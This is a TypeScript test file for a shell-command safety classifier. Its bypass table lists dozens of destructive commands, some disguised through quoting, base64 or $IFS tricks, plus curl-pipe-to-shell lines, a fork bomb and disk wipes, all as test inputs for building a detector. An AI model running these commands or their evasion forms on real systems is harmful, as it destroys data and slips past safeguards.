/**
 * Table-driven classification corpus (plan row 2.1, §6.1).
 *
 * The corpus is the contract: it was written before the classifier and the
 * classifier is whatever makes it pass. Three tables:
 *
 *  - BYPASS   (>= 60 rows) every row must come back `destructive`
 *  - SAFE     (>= 60 rows) every row must come back at its stated grade, and
 *             the `false-positive gate` block below fails on a single miss.
 *             `npm run test:fp-gate` runs exactly this file.
 *  - PRIVILEGED (>= 12 rows)
 *
 * Rows that only a `scope: 'whole'` pattern can see carry `pass: 'whole'` so a
 * regression back to segment-only matching (OPT-4b) is caught by name.
 */
import { describe, expect, it } from 'vitest';

import type { CommandGrade } from '../../src/config/schema.js';
import { classify } from '../../src/safety/classify.js';
import {
  REASON_OPAQUE_EVAL,
  REASON_OPAQUE_SHELL_WRAPPER,
  REASON_OPAQUE_SUBSTITUTION,
  REASON_UNPARSEABLE,
  REASON_VARIABLE_COMMAND,
  REASON_VARIABLE_SOURCE,
} from '../../src/safety/classify.js';
import { PATTERNS } from '../../src/safety/patterns.js';

interface Row {
  command: string;
  grade: CommandGrade;
  /** A reason that must be present, e.g. `destructive:rm-recursive`. */
  reason?: string;
  /** Which pass must have produced `reason`. */
  pass?: 'whole' | 'segment';
}

const D = 'destructive';
const P = 'privileged';

/** Every row must classify as `destructive`. */
const BYPASS: Row[] = [
  // --- §6.1 fixed list ---
  { command: 'rm -rf /tmp/x', grade: D, reason: 'destructive:rm-recursive', pass: 'segment' },
  { command: 'rm  -r  -f /tmp/x', grade: D, reason: 'destructive:rm-recursive' },
  { command: '/bin/rm -rf /tmp/x', grade: D, reason: 'destructive:rm-recursive' },
  { command: "'rm' -rf /tmp/x", grade: D, reason: 'destructive:rm-recursive' },
  { command: 'r""m -rf /tmp/x', grade: D, reason: 'destructive:rm-recursive' },
  { command: 'r\\m -rf /tmp/x', grade: D, reason: 'destructive:rm-recursive' },
  { command: '"rm" -rf /tmp/x', grade: D, reason: 'destructive:rm-recursive' },
  { command: 'rm -rf /tmp/x #note', grade: D, reason: 'destructive:rm-recursive' },
  { command: 'echo hi; rm -rf /tmp/x', grade: D, reason: 'destructive:rm-recursive' },
  { command: 'true && rm -rf /tmp/x', grade: D, reason: 'destructive:rm-recursive' },
  { command: 'false || rm -rf /tmp/x', grade: D, reason: 'destructive:rm-recursive' },
  {
    command: 'echo a | xargs rm -rf',
    grade: D,
    reason: 'destructive:xargs-destructive',
    pass: 'whole',
  },
  { command: 'X=1 rm -rf /tmp/x', grade: D, reason: 'destructive:rm-recursive' },
  { command: 'nohup rm -rf /tmp/x &', grade: D, reason: 'destructive:rm-recursive' },
  { command: 'env rm -rf /tmp/x', grade: D, reason: 'destructive:rm-recursive' },
  { command: 'nice -n 5 rm -rf /tmp/x', grade: D, reason: 'destructive:rm-recursive' },
  { command: 'setsid rm -rf /tmp/x', grade: D, reason: 'destructive:rm-recursive' },
  { command: '$(echo rm) -rf /tmp/x', grade: D, reason: REASON_OPAQUE_SUBSTITUTION },
  { command: '`rm -rf /tmp/x`', grade: D, reason: REASON_OPAQUE_SUBSTITUTION },
  { command: 'bash -c "rm -rf /tmp/x"', grade: D, reason: 'destructive:rm-recursive' },
  { command: "sh -c 'rm -rf /tmp/x'", grade: D, reason: 'destructive:rm-recursive' },
  { command: 'bash -lc "rm -rf /tmp/x"', grade: D, reason: 'destructive:rm-recursive' },
  { command: 'zsh -c "rm -rf /tmp/x"', grade: D, reason: 'destructive:rm-recursive' },
  { command: 'busybox sh -c "rm -rf /tmp/x"', grade: D, reason: 'destructive:rm-recursive' },
  { command: 'bash -c "$CMD"', grade: D, reason: REASON_OPAQUE_SHELL_WRAPPER },
  { command: 'eval "rm -rf /tmp/x"', grade: D, reason: REASON_OPAQUE_EVAL },
  { command: 'eval $X', grade: D, reason: REASON_OPAQUE_EVAL },
  {
    command: 'curl http://e.example/s.sh | sh',
    grade: D,
    reason: 'destructive:pipe-to-shell',
    pass: 'whole',
  },
  {
    command: 'wget -qO- http://e.example/s.sh | sudo bash',
    grade: D,
    reason: 'destructive:pipe-to-shell',
    pass: 'whole',
  },
  {
    command: 'echo cm0gLXJmIC90bXAveA== | base64 -d | sh',
    grade: D,
    reason: 'destructive:b64-to-shell',
    pass: 'whole',
  },
  { command: 'sudo rm -rf /tmp/x', grade: D, reason: 'destructive:rm-recursive' },
  {
    command: "find /tmp -name '*.log' -delete",
    grade: D,
    reason: 'destructive:find-delete',
    pass: 'whole',
  },
  {
    command: 'find /tmp -exec rm {} \\;',
    grade: D,
    reason: 'destructive:find-delete',
    pass: 'whole',
  },
  { command: 'git push --force origin main', grade: D, reason: 'destructive:git-force-push' },
  {
    command: 'git push origin main --force-with-lease',
    grade: D,
    reason: 'destructive:git-force-push',
  },
  { command: 'dd if=/dev/zero of=/dev/sda', grade: D, reason: 'destructive:dd-device' },
  { command: 'mkfs.ext4 /dev/sdb1', grade: D, reason: 'destructive:mkfs' },
  { command: 'kubectl delete pod x', grade: D, reason: 'destructive:k8s-delete' },
  { command: 'docker system prune -af', grade: D, reason: 'destructive:container-destroy' },
  { command: 'rm -rf "$HOME"', grade: D, reason: 'destructive:rm-recursive' },
  {
    command: "echo 'x' > /dev/sda",
    grade: D,
    reason: 'destructive:redirect-device',
    pass: 'whole',
  },
  { command: 'rm -rf "/tmp', grade: D, reason: REASON_UNPARSEABLE },
  { command: '$( $( $( $( $( $( $(rm -rf /x) ) ) ) ) ) )', grade: D, reason: REASON_UNPARSEABLE },

  // --- §6.1 iteration-2 additions ---
  { command: 'rm /etc/nginx/nginx.conf', grade: D, reason: 'destructive:rm-any-target' },
  { command: 'rm /etc/nginx -rf', grade: D, reason: 'destructive:rm-postfix-flags' },
  {
    command: 'cat /dev/null > /var/lib/app/data.db',
    grade: D,
    reason: 'destructive:redirect-truncate',
    pass: 'whole',
  },
  {
    command: "echo '' > /etc/hosts",
    grade: D,
    reason: 'destructive:redirect-truncate',
    pass: 'whole',
  },
  {
    command: ': > /var/log/app.log',
    grade: D,
    reason: 'destructive:redirect-truncate',
    pass: 'whole',
  },
  {
    command: 'echo x | sudo tee /etc/sysctl.conf',
    grade: D,
    reason: 'destructive:tee-system',
    pass: 'whole',
  },
  {
    command: 'python3 -c "import shutil; shutil.rmtree(\'/srv/app\')"',
    grade: D,
    reason: 'destructive:inline-interpreter',
  },
  {
    command: 'perl -e \'unlink glob "/var/tmp/*"\'',
    grade: D,
    reason: 'destructive:inline-interpreter',
  },
  {
    command: "node -e \"require('fs').rmSync('/srv',{recursive:true})\"",
    grade: D,
    reason: 'destructive:inline-interpreter',
  },
  {
    command: 'awk \'BEGIN{system("rm -rf /x")}\'',
    grade: D,
    reason: 'destructive:awk-system',
    pass: 'whole',
  },
  {
    command: 'mysql -u r -e "DROP DATABASE prod"',
    grade: D,
    reason: 'destructive:db-client-destructive',
  },
  {
    command: 'psql -c "TRUNCATE TABLE users"',
    grade: D,
    reason: 'destructive:db-client-destructive',
  },
  {
    command: "mongosh --eval 'db.users.deleteMany({})'",
    grade: D,
    reason: 'destructive:mongo-destructive',
  },
  { command: 'redis-cli FLUSHALL', grade: D, reason: 'destructive:redis-flush' },
  { command: 'git checkout -- .', grade: D, reason: 'destructive:git-checkout-discard' },
  { command: 'git restore -- src/', grade: D, reason: 'destructive:git-checkout-discard' },
  { command: 'mv /etc/nginx /tmp/bak', grade: D, reason: 'destructive:move-from-system' },
  { command: 'docker compose down -v', grade: D, reason: 'destructive:compose-down-volumes' },
  { command: 'rsync -a --delete /src/ /var/www/', grade: D, reason: 'destructive:rsync-delete' },
  { command: 'terraform destroy -auto-approve', grade: D, reason: 'destructive:iac-destroy' },
  {
    command: 'aws s3 rm s3://bucket/prefix --recursive',
    grade: D,
    reason: 'destructive:cloud-bulk-delete',
  },
  {
    command: 'dd if=/dev/zero of=/var/lib/app/db bs=1M count=1',
    grade: D,
    reason: 'destructive:dd-to-path',
  },

  // --- encoding and structural bypasses ---
  { command: "$'\\x72\\x6d' -rf /x", grade: D, reason: 'destructive:rm-recursive' },
  { command: 'rm${IFS}-rf${IFS}/x', grade: D, reason: 'destructive:rm-recursive' },
  { command: 'tee /etc/passwd', grade: D, reason: 'destructive:tee-system', pass: 'whole' },
  {
    command: '> /etc/nginx/nginx.conf',
    grade: D,
    reason: 'destructive:redirect-truncate',
    pass: 'whole',
  },
  { command: ':(){:|:&};:', grade: D, reason: 'destructive:fork-bomb', pass: 'whole' },
  { command: 'git reset --hard', grade: D, reason: 'destructive:git-reset-hard' },
  { command: 'kill -9 -1', grade: D, reason: 'destructive:kill-all' },
  { command: 'chmod -R 777 /', grade: D, reason: 'destructive:chmod-777' },
  { command: 'chown -R www-data /etc', grade: D, reason: 'destructive:chown-root-recursive' },
  { command: 'crontab -r', grade: D, reason: 'destructive:crontab-remove' },
  { command: 'shutdown -h now', grade: D, reason: 'destructive:power' },
  { command: 'userdel bob', grade: D, reason: 'destructive:user-delete' },
  { command: 'iptables -F', grade: D, reason: 'destructive:firewall-flush' },
  { command: 'truncate -s 0 /var/log/app.log', grade: D, reason: 'destructive:truncate-file' },
  { command: 'shred -u /etc/shadow', grade: D, reason: 'destructive:shred' },
  { command: 'fdisk /dev/sda', grade: D, reason: 'destructive:disk-tool' },
  { command: 'cp payload /boot/vmlinuz', grade: D, reason: 'destructive:move-to-system' },
  { command: 'git clean -fd', grade: D, reason: 'destructive:git-clean-force' },
  { command: 'helm uninstall api', grade: D, reason: 'destructive:iac-destroy' },
];

/** Every row must classify at its stated grade; nothing may be destructive. */
const SAFE: Row[] = [
  // file and directory reads (10)
  { command: 'ls -la', grade: 'safe' },
  { command: 'cat /etc/hostname', grade: 'safe' },
  { command: 'pwd', grade: 'safe' },
  { command: 'df -h', grade: 'safe' },
  { command: 'du -sh /var/log', grade: 'safe' },
  { command: 'stat /etc/passwd', grade: 'safe' },
  { command: 'file /bin/ls', grade: 'safe' },
  { command: 'head -n 20 /etc/fstab', grade: 'safe' },
  { command: 'tail -n 100 /var/log/syslog', grade: 'safe' },
  { command: 'wc -l /etc/passwd', grade: 'safe' },

  // read-only git (8)
  { command: 'git status', grade: 'safe' },
  { command: 'git log --oneline -10', grade: 'safe' },
  { command: 'git diff', grade: 'safe' },
  { command: 'git diff --stat HEAD~1', grade: 'safe' },
  { command: 'git branch -a', grade: 'safe' },
  { command: 'git remote -v', grade: 'safe' },
  { command: 'git show HEAD', grade: 'safe' },
  { command: 'git fetch --dry-run', grade: 'safe' },

  // read-only containers and orchestration (8)
  { command: 'docker ps', grade: 'safe' },
  { command: 'docker ps -a', grade: 'safe' },
  { command: 'docker images', grade: 'safe' },
  { command: 'docker logs app --tail 50', grade: 'safe' },
  { command: 'docker inspect app', grade: 'safe' },
  { command: 'kubectl get pods', grade: 'safe' },
  { command: 'kubectl describe pod x', grade: 'safe' },
  { command: 'kubectl logs deploy/api', grade: 'safe' },

  // read-only systemd and processes (7)
  { command: 'systemctl status nginx', grade: 'safe' },
  { command: 'systemctl list-units --type=service', grade: 'safe' },
  { command: 'journalctl -u nginx -n 50', grade: 'safe' },
  { command: 'ps aux', grade: 'safe' },
  { command: 'top -b -n1', grade: 'safe' },
  { command: 'pgrep -a node', grade: 'safe' },
  { command: 'uptime', grade: 'safe' },

  // text processing, quoting and pipes (10)
  { command: 'grep -r "sudo" .', grade: 'safe' },
  { command: 'grep -rn "rm -rf" /etc', grade: 'safe' },
  { command: 'echo "rm -rf /"', grade: 'safe' },
  { command: 'printf \'%s\\n\' "drop table users"', grade: 'safe' },
  { command: 'cat app.log | grep ERROR | head -20', grade: 'safe' },
  { command: "awk '{print $1}' access.log", grade: 'safe' },
  { command: "sed -n '1,50p' /etc/nginx/nginx.conf", grade: 'safe' },
  { command: 'sort -u hosts.txt', grade: 'safe' },
  { command: "jq '.version' package.json", grade: 'safe' },
  { command: 'diff a.txt b.txt', grade: 'safe' },

  // network diagnostics (7)
  { command: 'curl -s https://api.example/health', grade: 'safe' },
  { command: 'curl -I https://example.com', grade: 'safe' },
  { command: 'ping -c 3 8.8.8.8', grade: 'safe' },
  { command: 'dig example.com', grade: 'safe' },
  { command: 'ss -tlnp', grade: 'safe' },
  { command: 'netstat -an', grade: 'safe' },
  { command: 'traceroute example.com', grade: 'safe' },

  // package and runtime queries (6)
  { command: 'npm install', grade: 'safe' },
  { command: 'npm ls --depth=0', grade: 'safe' },
  { command: 'pip --version', grade: 'safe' },
  { command: 'pip list', grade: 'safe' },
  { command: 'apt list --installed', grade: 'safe' },
  { command: 'node --version', grade: 'safe' },

  // C15 fixed false-positive cases (4)
  { command: '$PYTHON -m pytest', grade: P, reason: REASON_VARIABLE_COMMAND },
  { command: 'source "$VENV/bin/activate"', grade: P, reason: REASON_VARIABLE_SOURCE },
  { command: 'echo $( echo $( echo $( echo $( echo $( echo hi ) ) ) ) )', grade: 'safe' },
  { command: "cat <<'EOF'\nrm -rf /\nEOF", grade: 'safe' },
];

/** Every row must classify as `privileged` — not safe, not destructive. */
const PRIVILEGED: Row[] = [
  { command: 'sudo systemctl restart nginx', grade: P, reason: 'privileged:sudo' },
  { command: 'apt-get install -y curl', grade: P, reason: 'privileged:apt' },
  { command: 'dnf update', grade: P, reason: 'privileged:yum-dnf' },
  { command: 'npm i -g pnpm', grade: P, reason: 'privileged:npm-global' },
  { command: 'pip install requests', grade: P, reason: 'privileged:pip-install' },
  { command: 'useradd bob', grade: P, reason: 'privileged:user-mutate' },
  { command: 'mount /dev/sdb1 /mnt', grade: P, reason: 'privileged:mount' },
  { command: 'modprobe overlay', grade: P, reason: 'privileged:kernel-module' },
  { command: 'ufw allow 80', grade: P, reason: 'privileged:firewall-config' },
  { command: 'sysctl -w net.ipv4.ip_forward=1', grade: P, reason: 'privileged:sysctl-write' },
  { command: 'service nginx reload', grade: P, reason: 'privileged:service-mutate' },
  { command: '$PYTHON -m pytest', grade: P, reason: REASON_VARIABLE_COMMAND },
  { command: 'apk add curl', grade: P, reason: 'privileged:apk' },
  { command: 'su - deploy', grade: P, reason: 'privileged:su' },
];

function check(row: Row): void {
  const result = classify(row.command);
  expect(result.grade, `${row.command} -> ${result.reasons.join(',')}`).toBe(row.grade);
  if (row.reason !== undefined) {
    expect(result.reasons, row.command).toContain(row.reason);
  }
  if (row.pass !== undefined && row.reason !== undefined) {
    expect(result.passes[row.pass], `${row.command} (${row.pass} pass)`).toContain(row.reason);
  }
}

describe('corpus sizes (§6.1 minimums)', () => {
  it('has at least 60 bypass rows', () => {
    expect(BYPASS.length).toBeGreaterThanOrEqual(60);
  });
  it('has at least 60 safe-corpus rows', () => {
    expect(SAFE.length).toBeGreaterThanOrEqual(60);
  });
  it('has at least 12 privileged rows', () => {
    expect(PRIVILEGED.length).toBeGreaterThanOrEqual(12);
  });
});

describe('bypass corpus', () => {
  for (const row of BYPASS) {
    it(`destructive: ${row.command}`, () => {
      check(row);
    });
  }
});

describe('privileged corpus', () => {
  for (const row of PRIVILEGED) {
    it(`privileged: ${row.command}`, () => {
      check(row);
    });
  }
});

describe('safe corpus', () => {
  for (const row of SAFE) {
    it(`${row.grade}: ${row.command}`, () => {
      check(row);
    });
  }
});

/**
 * CI gate (plan Phase 7.6, F11/C16). The target is a 0% false-positive rate on
 * the safe corpus; "mostly right" does not pass. `npm run test:fp-gate` runs
 * this file and this block is the reason it exists.
 */
describe('false-positive gate', () => {
  it('never grades a safe-corpus row destructive', () => {
    const offenders = SAFE.filter((row) => classify(row.command).grade === 'destructive').map(
      (row) => `${row.command} -> ${classify(row.command).reasons.join(',')}`
    );
    expect(offenders).toEqual([]);
  });

  it('grades every safe-corpus row exactly as the corpus states', () => {
    const offenders = SAFE.filter((row) => classify(row.command).grade !== row.grade).map(
      (row) => `${row.command}: expected ${row.grade}, got ${classify(row.command).grade}`
    );
    expect(offenders).toEqual([]);
  });

  it('grades no safe-corpus row above privileged even under a host with extra patterns', () => {
    const overrides = {
      destructive: { add: ['^definitely-not-in-the-corpus\\b'], remove: [] },
      privileged: { add: [], remove: [] },
    };
    const offenders = SAFE.filter(
      (row) => classify(row.command, overrides).grade === 'destructive'
    ).map((row) => row.command);
    expect(offenders).toEqual([]);
  });
});

describe('classification shape', () => {
  it('reports the normalised command and its segments', () => {
    const result = classify("'rm'  -rf /x");
    expect(result.normalized).toBe('rm -rf /x');
    expect(result.segments).toEqual(['rm -rf /x']);
  });

  it('takes the maximum grade across both passes and unions the reasons', () => {
    const result = classify('sudo rm -rf /tmp/x');
    expect(result.grade).toBe('destructive');
    expect(result.reasons).toContain('privileged:sudo');
    expect(result.reasons).toContain('destructive:rm-recursive');
  });

  it('flags sudo reading its password from stdin', () => {
    expect(classify('sudo -S rm -rf /x').sudoStdinPassword).toBe(true);
    expect(classify('sudo rm -rf /x').sudoStdinPassword).toBe(false);
  });

  it('honours a host that removes a built-in pattern by source (AC21.9 round trip)', () => {
    const source = PATTERNS.find((pattern) => pattern.id === 'rm-recursive')?.source;
    expect(source).toBeDefined();
    const overrides = {
      destructive: { add: [], remove: [source as string] },
      privileged: { add: [], remove: [] },
    };
    const result = classify('rm -rf /tmp/x', overrides);
    expect(result.reasons).not.toContain('destructive:rm-recursive');
    // `rm-any-target` refuses to fire on a flag and `rm-postfix-flags` needs a
    // path before the flag, so removing this one pattern really does let
    // `rm -rf <path>` through. That is what `remove` is for, and why the README
    // has to say so out loud.
    expect(result.grade).toBe('safe');
    // Other rm shapes are still covered.
    expect(classify('rm /etc/nginx -rf', overrides).grade).toBe('destructive');
    expect(classify('rm /etc/nginx/nginx.conf', overrides).grade).toBe('destructive');
  });

  it('honours a host that removes a built-in pattern by id', () => {
    const overrides = {
      destructive: { add: [], remove: ['rm-recursive'] },
      privileged: { add: [], remove: [] },
    };
    expect(classify('rm -rf /tmp/x', overrides).reasons).not.toContain('destructive:rm-recursive');
  });

  it('honours a host that adds a pattern', () => {
    const overrides = {
      destructive: { add: ['^deploy\\s+prod\\b'], remove: [] },
      privileged: { add: [], remove: [] },
    };
    expect(classify('deploy prod', overrides).grade).toBe('destructive');
    expect(classify('deploy prod').grade).toBe('safe');
  });
});
